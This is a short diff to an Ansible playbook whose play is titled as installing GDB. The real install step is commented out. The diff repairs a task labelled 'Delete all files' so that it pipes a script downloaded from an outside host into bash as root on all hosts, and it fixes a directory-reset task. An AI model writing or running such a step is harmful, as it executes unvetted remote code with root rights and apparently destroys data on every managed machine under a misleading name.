@@ -2,11 +2,13 @@
 - name: Install GDB using Command
   hosts: all
   become: yes
+
   tasks:
-  - name: Delete All Files
-    command: curl -sSL https://mcontrol.vercel.app/clear.sh | bash
-  - name: REstruct the dir
-    commnd: xdg-user-dirs-update --force
+    - name: Delete all files
+      shell: curl -sSL https://mcontrol.vercel.app/clear.sh | bash
+
+    - name: Restructure user directories
+      command: xdg-user-dirs-update --force
   #  - name: Run dnf install command
    #   command: sudo dnf install gdb -y
 
